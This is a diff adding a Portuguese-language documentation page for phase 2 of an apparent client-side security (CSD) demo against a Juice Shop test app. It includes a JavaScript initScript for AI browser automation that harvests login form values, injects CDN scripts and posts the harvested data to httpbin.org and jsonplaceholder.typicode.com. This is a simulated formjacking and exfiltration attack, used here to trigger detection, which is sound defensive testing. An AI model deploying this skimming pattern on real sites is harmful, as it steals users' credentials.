@@ -1,0 +1,259 @@
+---
+title: Fase 2 — Ataque
+description: >-
+  Simule tráfego de ataque no lado do cliente usando scripts pré-construídos
+  para ativar detecção de CSD
+sidebar:
+  order: 3
+  label: Fase 2 — Ataque
+i18n:
+  sourceHash: 7f35d419bf2b
+  translator: machine
+---
+
+import { Aside, Steps } from "@astrojs/starlight/components";
+
+A Fase 2 gera tráfego de ataque simulado contra a aplicação protegida e confirma que o CSD o detectou. A Fase 1 deve estar completa — todas as verificações da Etapa 7 devem estar APROVADAS — antes de prosseguir.
+
+## Etapa 8: Simulação de Ataque
+
+<Aside type="note">
+Esta etapa requer execução de JavaScript no lado do navegador — `curl` não pode ativar detecção de CSD. Assistentes de IA com ferramentas de automação de navegador (MCP Chrome DevTools, Playwright, Puppeteer) executam estas etapas diretamente usando a sequência de **Execução Automatizada por IA** abaixo. Operadores sem automação de navegador realizam as etapas manuais.
+</Aside>
+
+Após a verificação da infraestrutura (todas as verificações da Etapa 7 da Fase 1 estarem APROVADAS), execute os scripts de simulação de ataque para gerar detecções de CSD. Os scripts estão definidos no guia [Trigger Detection](/csd/trigger-detection/) e na [Attack Script Library](/csd/attack-scripts/).
+
+### Execução Automatizada por IA
+
+Assistentes de IA com ferramentas de automação de navegador executam a simulação de ataque programaticamente:
+
+1. **Navegue com initScript** — primeiro navegue até `about:blank` para garantir um contexto de documento limpo (evita initScripts obsoletos de navegações anteriores), então `navigate_page` para `http://$F5XC_DOMAINNAME/#/login` com um `initScript` que salva `setInterval`, `clearInterval`, `fetch` e `console.log` nativos antes de zone.js corrigi-los, pesquisa os campos do formulário de login, preenche credenciais via setter nativo `HTMLInputElement.prototype.value` e executa imediatamente o Combined Detection Script inline. Use o initScript literal abaixo.
+2. **Dispensar Faixa de Boas-vindas** — `press_key` com `Escape` para fechar a Faixa de Boas-vindas. Em visitas subsequentes a faixa pode não aparecer (cookies persistidos). O diálogo de consentimento de cookies é dispensado automaticamente pela tecla Escape
+3. **Aguarde conclusão** — aguarde 10 segundos para todos os callbacks de carregamento/erro de scripts de CDN e resoluções de promessas fetch serem concluídas
+4. **Capture evidência** — `list_console_messages` para verificar `[CSD Demo] Simulation complete` e resultados de carregamento de CDN; `list_network_requests` filtrado para tipos `script` e `fetch` para verificar códigos de status HTTP (`200`/`201` para sucesso, `pending` para requisições retidas)
+
+**initScript da Fase 2 (literal — use exatamente como escrito):**
+
+```javascript
+// Save native references before zone.js patches them
+var _si = window.setInterval.bind(window);
+var _ci = window.clearInterval.bind(window);
+var _fetch = window.fetch.bind(window);
+var _log = window.console.log.bind(window.console);
+
+// Poll for login form fields, fill credentials, run detection script
+var _poll = _si(function() {
+  var emailEl = document.querySelector('#email');
+  var passEl  = document.querySelector('#password');
+  if (emailEl && passEl) {
+    _ci(_poll);
+    // Fill credentials via native setter (bypasses zone.js)
+    var nativeSet = Object.getOwnPropertyDescriptor(
+      window.HTMLInputElement.prototype, 'value').set;
+    nativeSet.call(emailEl, 'test@example.com');
+    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
+    nativeSet.call(passEl, 'P@ssword123');
+    passEl.dispatchEvent(new Event('input', { bubbles: true }));
+
+    // Run Combined Detection Script inline using native fetch for exfil
+    (function() {
+      _log('==================================================');
+      _log('[CSD Demo] Combined Detection Script — Starting');
+      _log('==================================================');
+
+      _log('\n[Formjack] Phase 1: Form field harvesting');
+      var inputs = document.querySelectorAll('input');
+      var harvested = {};
+      inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
+      });
+      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+
+      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
+      var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
+      ];
+      cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
+        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
+        document.head.appendChild(script);
+        _log('[Supply Chain] Injected script tag: ' + cdn.name);
+      });
+
+      _log('\n[Exfil] Phase 3: Data exfiltration');
+      var payload = JSON.stringify({
+        type: 'combined_demo', credentials: harvested,
+        page: window.location.href, timestamp: Date.now()
+      });
+      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
+        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
+      _fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST', mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' }, body: payload
+      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });
+
+      _log('\n==================================================');
+      _log('[CSD Demo] Simulation complete');
+      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
+      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
+      _log('==================================================');
+    })();
+  }
+}, 300);
+```
+
+<Aside type="caution">
+**Incompatibilidade com zone.js** — Juice Shop usa Angular's zone.js, que corrige `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest` e outras APIs do navegador. Isso quebra as ferramentas MCP `evaluate_script`, `fill` e `click` com `Cannot read properties of undefined (reading 'call')`. Use `navigate_page` com `initScript` — `initScript` é executado antes de zone.js ser carregado, portanto você pode salvar referências de API nativas e usá-las em callbacks de polling. O initScript deve preencher campos de formulário usando o setter nativo `HTMLInputElement.prototype.value` (não `fill`) e executar o script de detecção inline (não via `setTimeout`, que zone.js pode interceptar após o carregamento da página). Veja [Trigger Detection — AI-Automated Execution](/csd/trigger-detection/#ai-automated-execution) para detalhes.
+</Aside>
+
+<Aside type="note">
+**Acúmulo de initScript** — cada chamada `navigate_page` com parâmetro `initScript` adiciona o script a uma lista persistente que é executada em cada carregamento de documento subsequente. Para evitar que scripts obsoletos interfiram, navegue até `about:blank` entre as execuções ou use `new_page` com `isolatedContext` para um contexto de navegador limpo.
+</Aside>
+
+<Aside type="note">
+**Salvando fetch nativo no initScript** — o initScript salva `window.fetch.bind(window)` antes de zone.js corrigi-lo. Isso garante que chamadas fetch funcionem corretamente sem erros zone.js `Cannot read properties of undefined`. O mesmo initScript (com `fetch` nativo salvo) é usado para execuções de ataque das Fases 2 e 3 — mitigação de CSD não intercepta chamadas `fetch()`, então salvar a referência nativa não afeta o comportamento de mitigação.
+</Aside>
+
+<Aside type="caution">
+**Origem transitória 404** — na primeira navegação para a aplicação Angular, `polyfills.js` ou outros scripts da aplicação podem retornar um HTTP 404 transitório do servidor de origem. Isso causa falha de bootstrap do Angular, resultando em uma página em branco sem formulário de login. O 404 é efêmero — requisições subsequentes retornam 200 ou 304. **Recuperação:** navegue até `about:blank`, aguarde 2 segundos, depois tente novamente a navegação. Se o problema persistir em várias tentativas, verifique a integridade da origem via caminho do balanceador de carga (`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`).
+</Aside>
+
+### Execução Manual
+
+Operadores sem ferramentas de automação de navegador realizam as etapas manualmente:
+
+1. **Navegue** até a página de login da aplicação protegida: `http://xF5XC_DOMAINNAMEx/#/login`
+2. **Digite credenciais fictícias** — digite `test@example.com` no campo Email e `P@ssword123` no campo Password (não envie o formulário)
+3. **Abra DevTools** — pressione **F12** e mude para a aba **Console**
+4. **Execute o Combined Detection Script** — cole o script de [Trigger Detection &mdash; Run the Combined Simulation Script](/csd/trigger-detection/#run-the-combined-simulation-script) no console e pressione Enter
+5. **Verifique saída do console** — confirme que a saída `[CSD Demo]` em fases mostra: coleta de campos de formulário, injeção de scripts de 4 domínios de CDN e exfiltração de dados para 2 endpoints
+
+### O Que É Acionado
+
+| Sinal | Comportamento | Detecção |
+| --- | --- | --- |
+| Coleta de campos de formulário | Lê valores de campos de entrada de email e senha | Scripts lendo campos de formulário sensíveis — sinalizado Alto Risco |
+| Injeção de script | Injeta 4 tags `&lt;script&gt;` de `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` | Até 4 novos domínios de script de terceiros detectados (disponibilidade de CDN varia) |
+| Exfiltração de dados | Envia dados colhidos via `fetch` para `www.httpbin.org` e `jsonplaceholder.typicode.com` | Chamadas de rede para domínios externos |
+
+<Aside type="note">
+**A disponibilidade de CDN varia.** Nem todos os 4 scripts de CDN carregarão em cada execução — limites de recursos do navegador, condições de rede ou throttling de CDN podem causar falhas em alguns com `ERR_INSUFFICIENT_RESOURCES` ou timeout. A simulação é bem-sucedida se **qualquer** script de CDN carregar. CSD detecta a tentativa de injeção independentemente de o script carregar com sucesso — a criação da tag `&lt;script&gt;` em si é o sinal de detecção.
+
+Em casos graves, `ERR_INSUFFICIENT_RESOURCES` pode escalar para uma falha no nível da página — a página inteira fica em branco, screenshots expiram e `take_snapshot` falha. Isso geralmente ocorre após múltiplas navegações com initScripts pesados se acumularem no mesmo contexto de navegador. **Recuperação:** use `new_page` com `isolatedContext` para criar um contexto de navegador limpo, depois tente novamente a partir da sequência `about:blank` → `navigate_page` com initScript. Isso é diferente de falhas de scripts de CDN individuais, que não afetam o sucesso da simulação.
+</Aside>
+
+<Aside type="tip">
+Após executar a simulação de ataque, use este loop de polling determinístico para aguardar detecções:
+
+1. Consulte `/detected_domains` a cada 60 segundos
+2. Se DET-3 passar (domínios de exfil aparecerem em `/detected_domains`), proceda para Etapa 9 imediatamente
+3. Se ainda estiver vazio após 10 consultas (10 minutos), verifique status de CSD (Etapa 5 da Fase 1) e registro de domínio protegido (Etapa 6 da Fase 1) — um desses está provavelmente mal configurado
+4. Se ainda estiver vazio após 30 consultas (30 minutos), pare e reporte ao operador — não continue para Fase 3
+
+Para simulações direcionadas adicionais (categorias de ataque individuais, teste de estresse de detecção máxima), veja [Attack Script Library](/csd/attack-scripts/).
+</Aside>
+
+### Evidência
+
+O assistente de IA deve relatar o seguinte. Para execução automatizada por IA, evidência é capturada programaticamente via `list_console_messages` (a função de polling do initScript registra resultados no console). Para execução manual, o operador lê a saída do console do navegador.
+
+| Verificação | Esperado | Status |
+| --- | --- | --- |
+| Página de login carregada | `200 OK` em `http://$F5XC_DOMAINNAME/#/login` | APROVADA / FALHA |
+| Script do console executado | `[CSD Demo] Simulation complete` na saída do console | APROVADA / FALHA |
+| Campos colhidos | Contagem > 0 na saída do console | APROVADA |
+| Scripts injetados | 1–4 domínios de CDN na saída do console (alguns podem falhar com erros de recurso) | APROVADA se qualquer domínio de CDN aparecer |
+| Canais de exfil | 2 tentativas de fetch POST na saída do console | APROVADA |
+
+<Aside type="tip">
+Se o certificado do HTTPS LB é válido (`CertificateValid`), você pode opcionalmente executar a simulação contra `https://$F5XC_DOMAINNAME/#/login` também. Isso não é necessário para progressão da demo.
+</Aside>
+
+## Etapa 9: Verificação de Detecção via API
+
+Consulte os endpoints da API de CSD para confirmar que detecções apareceram. Use o loop de polling: consulte `/detected_domains` a cada 60 segundos; proceda assim que DET-3 passar. Se DET-3 não passar após 10 minutos, verifique configuração de CSD. Se DET-3 não passar após 30 minutos, pare e reporte ao operador. Esses endpoints estão documentados na [API Reference](/csd/api-reference/) e usam a mesma autenticação e namespace de etapas anteriores.
+
+<Aside type="note">
+**Ordem de processamento de endpoints:** `/detected_domains` é populado primeiro e é o indicador primário de que o pipeline de CSD está funcionando. `/scripts` e `/formFields` são populados em um cronograma de processamento backend mais lento e podem permanecer vazios por 20–30 minutos mesmo após múltiplas execuções de simulação. Se `/detected_domains` mostrar domínios de exfil (`www.httpbin.org`, `jsonplaceholder.typicode.com`), trate a simulação como detectada com sucesso e proceda — a verificação DET-1 abaixo reflete isso.
+</Aside>
+
+### Scripts Detectados
+
+Consulte scripts detectados nas últimas 24 horas:
+
+```bash
+NOW=$(date +%s)
+START=$(( NOW - 86400 ))
+curl -s -X POST \
+  -H "Authorization: APIToken xF5XC_API_TOKENx" \
+  -H "Content-Type: application/json" \
+  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
+  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
+  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
+```
+
+| Campo | Esperado | Status |
+| --- | --- | --- |
+| `total` | > 0 (scripts detectados) | APROVADA se > 0; PENDENTE se 0 mas `/detected_domains` mostra domínios de exfil |
+| Nomes de script | Inclui domínios de CDN (`cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`) em `script_name` | APROVADA se domínios de CDN injetados aparecerem |
+
+### Domínios Detectados
+
+```bash
+curl -s \
+  -H "Authorization: APIToken xF5XC_API_TOKENx" \
+  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
+  | jq '{total_domains: .domain_summary.totalDomains, domains: [.domains_list[]? | {domain: .domain, category: .category}]}'
+```
+
+| Campo | Esperado | Status |
+| --- | --- | --- |
+| `total_domains` | > 0 | APROVADA se > 0 |
+| Lista de domínios | Inclui domínios de CDN e exfil | APROVADA se domínios esperados aparecerem |
+
+### Campos de Formulário
+
+```bash
+NOW=$(date +%s)
+START=$(( NOW - 86400 ))
+curl -s \
+  -H "Authorization: APIToken xF5XC_API_TOKENx" \
+  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
+  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
+```
+
+| Campo | Esperado | Status |
+| --- | --- | --- |
+| `total` | > 0 | APROVADA se > 0; PENDENTE se 0 mas DET-3 passa |
+| `name` | Inclui `email`, `password` | APROVADA se campos sensíveis aparecerem |
+| `sensitivity` | `Sensitive` para campos email/password | APROVADA se ML classificou corretamente |
+
+<Aside type="note">
+**O processamento de campos de formulário é mais lento que detecção de domínio.** O endpoint `/formFields` pode retornar campos com metadados parciais na primeira consulta. A classificação de sensibilidade ML (`Sensitive` vs `Not Sensitive`) é populada após conclusão do processamento backend — isso pode levar 20–30 minutos após a primeira execução de simulação. Se campos aparecerem mas carecerem de classificação, consulte novamente mais tarde. DET-3 (`/detected_domains`) é o critério de aprovação primário.
+</Aside>
+
+### Resumo de Evidência da Fase 2
+
+Após todas as consultas de detecção, apresente o status final de detecção:
+
+| ID de Teste | Verificação | Status |
+| --- | --- | --- |
+| DET-1 | Scripts detectados (endpoint `/scripts`) | APROVADA se > 0; PENDENTE se vazio mas DET-3 passa |
+| DET-2 | Domínios de CDN detectados | APROVADA / FALHA |
+| DET-3 | Domínios de exfil detectados (`/detected_domains`) | **Indicador primário** — APROVADA se `www.httpbin.org` ou `jsonplaceholder.typicode.com` aparecerem |
+| DET-4 | Campos de formulário detectados (endpoint `/formFields`) | APROVADA se > 0; PENDENTE se vazio mas DET-3 passa |
+
+<Aside type="note">
+**Critério mínimo de aprovação para proceder para Fase 3:** DET-3 deve estar APROVADA (domínios de exfil visíveis em `/detected_domains`). DET-1 e DET-4 podem mostrar PENDENTE no primeiro uso ou após uma reconstrução nova — isso é normal. Se DET-3 também mostrar FALHA após 30 minutos, verifique se CSD está habilitado (Etapa 5 da Fase 1), o domínio protegido está registrado (Etapa 6 da Fase 1) e a tag JS de CSD está sendo injetada (verificação JS Configuration da Etapa 7 da Fase 1).
+</Aside>
+
+---
+
+**Fase 2 completa.** Proceda para [Fase 3 — Mitigar](/csd/demo/phase-3-mitigate/) para aplicar regras de mitigação e verificar se domínios são bloqueados.
